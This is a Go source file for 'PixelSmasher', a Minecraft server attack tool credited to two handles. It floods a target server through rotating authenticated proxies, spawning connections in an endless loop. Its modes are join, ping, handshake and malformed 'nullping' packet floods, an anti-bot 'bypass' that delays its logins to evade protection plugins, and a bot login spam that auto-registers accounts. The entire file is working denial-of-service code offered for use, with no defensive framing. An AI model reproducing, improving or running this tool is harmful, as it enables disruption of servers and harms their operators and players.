package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"math/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
	"sync"
)

func main() {
	var protocolVersion, threads, cores int
	var host, proxyFile, name string
	var joiner, pinger, handshake, antibot, pingjoin, bypass, nullping, cps, loginspam bool
	var Reset = "\033[0m"
	var Red = "\033[31m"
	var Yellow = "\033[33m"
	var Blue = "\033[34m"
	var Magenta = "\033[35m"
	//var White = "\033[97m"
	var Green = "\033[32m"
	var Cyan = "\033[36m"

	flag.StringVar(&host, "host", "", "IP of the server")
	flag.StringVar(&name, "name", "Ancient", "Name of the spammed bots")
	flag.BoolVar(&loginspam, "loginspam", false, "command to execute when loined")
	flag.IntVar(&protocolVersion, "protocol", 47, "Minecraft protocol version")
	flag.BoolVar(&joiner, "join", false, "join method")
	flag.BoolVar(&cps, "cps", false, "cps method")
	flag.BoolVar(&handshake, "handshake", false, "handshake method")
	flag.BoolVar(&bypass, "bypass", false, "Sonar/jhab bypass")
	flag.BoolVar(&pinger, "ping", false, "ping method")	
	flag.BoolVar(&nullping, "nullping", false, "null ping method")
	flag.BoolVar(&antibot, "antibot", false, "antibot mode")
	flag.BoolVar(&pingjoin, "pingjoin", false, "pingjoin method")
	flag.IntVar(&threads, "threads", 1, "Number of threads")
	flag.IntVar(&cores, "cores", 1, "Number of CPU cores to use")
	flag.StringVar(&proxyFile, "proxyfile", "proxies.txt", "Proxy file (auth HTTP proxies only)")
	flag.Parse()
	if flag.NFlag() == 0 {
		fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
		fmt.Println("")
		fmt.Println(Blue + "                                     BY hakaneren899 and Randomname" + Reset)
		fmt.Println("")
		fmt.Println("")
		fmt.Println(Yellow + "./pixelsmasher -host <hostname:port> -threads <threads> -protocol <protocol-version> -proxyfile <proxies.txt> -name <botusername> -<methodname>" + Reset)
		fmt.Println("")
		fmt.Println(Green + "Methods:" + Reset)
		fmt.Println("")
		fmt.Println(Green + "1) " + Cyan + "Join" + Reset)
		fmt.Println(Green + "2) " + Cyan + "Ping" + Reset)
		fmt.Println(Green + "3) " + Cyan + "Pingjoin" + Reset)
		fmt.Println(Green + "4) " + Cyan + "Nullping" + Reset)
		fmt.Println(Green + "5) " + Cyan + "Handshake" + Reset)
		fmt.Println(Green + "6) " + Cyan + "Bypass" + Reset)
		fmt.Println(Green + "7) " + Cyan + "Cps" + Reset)
		fmt.Println("")
		//fmt.Println(Red + "Note: You can also use multiple flags at the end of the arguments. For ex: -join -ping -handshake" + Reset)
		//fmt.Println("")
		return
	}
	runtime.GOMAXPROCS(cores)
	var modes []string
	if joiner {
		modes = append(modes, "join")
	}
	if pinger {
		modes = append(modes, "ping")
	}
	if handshake {
		modes = append(modes, "hand")
	}
	if nullping {
		modes = append(modes, "nullping")
	}
	
	if bypass {
		modes = append(modes, "bypass")
	}
	if cps {
	    modes = append(modes, "cps")
	    }
	    if loginspam {
	    modes = append(modes, "loginspam")
	    }
	    if antibot {
	        modes = append(modes, "antibot")
	    }
	    if pingjoin {
	    	modes = append(modes, "pingjoin")
	    	}
	    
	proxies, err := loadProxies(proxyFile)
	if err != nil {
		fmt.Printf("Failed to load proxies: %v\n", err)
		return
	}
	hostParts := strings.Split(host, ":")
	if len(hostParts) != 2 {
		fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
		return
	}
	host = hostParts[0]
	portStr := hostParts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
	fmt.Println("")
	fmt.Println(Blue + "                                    BY hakaneren899 and Randomname" + Reset)
	fmt.Println("")
	fmt.Println("")
	fmt.Println(Green+"Target IP:"+Magenta, host, port)
	fmt.Println(Green+"Bot Username:"+Magenta, name)
	fmt.Println(Green+"Mode:"+Magenta, modes)
	fmt.Println(Green+"Proxy File:"+Magenta, proxyFile)
	fmt.Println(Green+"Cores Used:"+Magenta, cores)
	fmt.Println(Green+"Threads:"+Magenta, threads)
	fmt.Println(Green+"Proxies Loaded:"+Magenta, len(proxies))
	fmt.Println(Reset)
	var wg sync.WaitGroup
	startSignal := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			select {
			case <-startSignal:
				for i := 0; ;i++ {
				rand.Seed(time.Now().UnixNano())
				username := fmt.Sprintf("%s%d", name, i)
				proxy := proxies[rand.Intn(len(proxies))]
				go spam(host, port, username, modes, proxy, protocolVersion)
				}
			}
		}(i)
	}

	close(startSignal)
	wg.Wait()
	}
func loadProxies(filePath string) ([]Proxy, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 4 {
			continue
		}
		port, _ := strconv.Atoi(parts[1])
		proxies = append(proxies, Proxy{
			Host:     parts[0],
			Port:     port,
			Username: parts[2],
			Password: parts[3],
		})
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return proxies, nil
}

func spam(host string, port int, username string, modes []string, proxy Proxy, protocolVersion int) {
			proxyAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password))
	        options := fmt.Sprintf("%s:%d", proxy.Host, proxy.Port)
	        conn, err := net.Dial("tcp", options)
	        if err != nil {
		        return
	        }
	        defer conn.Close()
	        connectRequest := fmt.Sprintf(
		        "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n",
		        host, port, host, port, proxyAuth,
	        )
	        
	        conn.Write([]byte(connectRequest))
	          connReader := bufio.NewReader(conn)
	          connReader.ReadString('\n')
		        for _, mode := range modes {
		        switch mode {
		        case "join": {
			        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			        conn.Write(createLoginPacket(username))
			        handleKeepAlive(conn)
			        }
		        case "bypass": {
			        time.Sleep(3500 * time.Millisecond)
			        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			        conn.Write(createLoginPacket(username))
			        handleKeepAlive(conn)
			        }
		        case "ping": {
			        conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
			        conn.Write(createRequestPacket())
		        }
		        case "hand": {
			        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			        }
		        case "nullping": {
			        conn.Write(createNullPingPacket())
		        }
		        case "cps": {
		        }
		        case "loginspam": {
			        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			        conn.Write(createLoginPacket(username))
			        cmdsend(conn)
		        }
		        case "pingjoin": {
		        //rand.Seed(time.Now().UnixNano())
				actions := []string{"ping", "join"}
				action := actions[rand.Intn(len(actions))]
					switch action {
					case "ping":
						conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
						conn.Write(createRequestPacket())
					case "join":
						conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
						conn.Write(createLoginPacket(username))
						handleKeepAlive(conn)
					}}
		        }}
	        }




func writeVarInt(value int) []byte {
	var buffer []byte
	for {
		if value&0xFFFFFF80 == 0 {
			buffer = append(buffer, byte(value))
			break
		}
		buffer = append(buffer, byte(value&0x7F|0x80))
		value >>= 7
	}
	return buffer
}
func cmdsend(conn net.Conn) {
reader := bufio.NewReader(conn)
	for {
		packetLength, err := readVarInt(reader)
		if err != nil {
			return
		}
		packetData := make([]byte, packetLength)
		_, err = io.ReadFull(reader, packetData)
		if err != nil {
			return
		}

		packetID, _ := readVarInt(bytes.NewReader(packetData))
		if packetID == 0x26 {
		fmt.Println("Registering")
		 packetID := encodeVarInt(0x03)
    	 messageData := encodeString("/register deneme123 deneme123")
   	  packet := append(packetID, messageData...)
  	   fullPacket := sendPacket(packet)
 	    conn.Write(fullPacket)
		}
	}
}

func receivepacket(conn net.Conn) (int, error) {
    packetLength, err := readVarInt(conn)
    if err != nil {
        fmt.Printf("Error reading packet length: %v\n", err)
        return 0, err
    }
    //fmt.Printf("Packet length: %d\n", packetLength)

    packetData, err := readFull(conn, packetLength)
    if err != nil {
        fmt.Printf("Error reading packet data: %v\n", err)
        return 0, err
    }

    reader := bytes.NewReader(packetData)
    packetID, err := readVarInt(reader)
    if err != nil {
        fmt.Printf("Error reading packet ID: %v\n", err)
        return 0, err
    }
    //fmt.Printf("Packet ID: %d\n", packetID)

    return packetID, nil
}


func handleKeepAlive(conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		packetLength, err := readVarInt(reader)
		if err != nil {
			return
		}
		packetData := make([]byte, packetLength)
		_, err = io.ReadFull(reader, packetData)
		if err != nil {
			return
		}

		packetID, _ := readVarInt(bytes.NewReader(packetData))
		if packetID == 0x21 {
			keepAliveID, _ := readVarInt(bytes.NewReader(packetData[1:]))
			conn.Write(createKeepAliveResponse(keepAliveID))
		}
	}
}

func createHandshakePacket(host string, port int, nextState int, protocolVersion int) []byte {
	hostBuffer := []byte(host)
	hostLength := writeVarInt(len(hostBuffer))
	portBuffer := []byte{byte(port >> 8), byte(port)}
	nextStateBuffer := writeVarInt(nextState)
	packetID := writeVarInt(0x00)
	protocolBuffer := writeVarInt(protocolVersion)
	packet := append(packetID, protocolBuffer...)
	packet = append(packet, hostLength...)
	packet = append(packet, hostBuffer...)
	packet = append(packet, portBuffer...)
	packet = append(packet, nextStateBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createKeepAliveResponse(keepAliveID int) []byte {
	packetID := writeVarInt(0x0B) 
	keepAliveIDBuffer := writeVarInt(keepAliveID)
	packet := append(packetID, keepAliveIDBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}



func createRequestPacket() []byte {
	packetID := writeVarInt(0x00)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
	}

func createLoginPacket(username string) []byte {
	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))
	packetID := writeVarInt(0x00)
	packet := append(packetID, usernameLength...)
	packet = append(packet, usernameBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createNullPingPacket() []byte {
	packetID := writeVarInt(0x2B)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}

func createCompressedPacket(packet []byte, threshold int) []byte {
	if len(packet) >= threshold {
		var buffer bytes.Buffer
		writer := zlib.NewWriter(&buffer)
		writer.Write(packet)
		writer.Close()
		return append(writeVarInt(buffer.Len()), buffer.Bytes()...)
	}
	return append(writeVarInt(0), packet...)
}



func readFull(reader io.Reader, length int) ([]byte, error) {
    buffer := make([]byte, length)
    bytesRead, err := io.ReadFull(reader, buffer)
    if err != nil {
        return nil, fmt.Errorf("expected to read %d bytes, but got %d: %v", length, bytesRead, err)
    }
    return buffer, nil
}


func sendPacket(packet []byte) []byte {
    packetLength := encodeVarInt(len(packet))
    fullPacket := append(packetLength, packet...)
    return fullPacket
}


func encodeVarInt(value int) []byte {
	var buffer []byte
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buffer = append(buffer, temp)
		if value == 0 {
			break
		}
	}
	return buffer
}

func encodeString(value string) []byte {
	var buffer bytes.Buffer
	stringLength := encodeVarInt(len(value))
	buffer.Write(stringLength)
	buffer.WriteString(value)
	return buffer.Bytes()
}

func readVarInt(reader io.Reader) (int, error) {
    var numRead int
    var result int
    for {
        var byteRead byte
        if err := binary.Read(reader, binary.BigEndian, &byteRead); err != nil {
            return 0, err
        }
        value := byteRead & 0x7F
        result |= int(value) << (7 * uint(numRead)) // Cast numRead to uint

        numRead++
        if numRead > 5 {
            return 0, fmt.Errorf("VarInt is too big: %d bytes read", numRead)
        }
        if byteRead&0x80 == 0 {
            break
        }
    }
    return result, nil
}

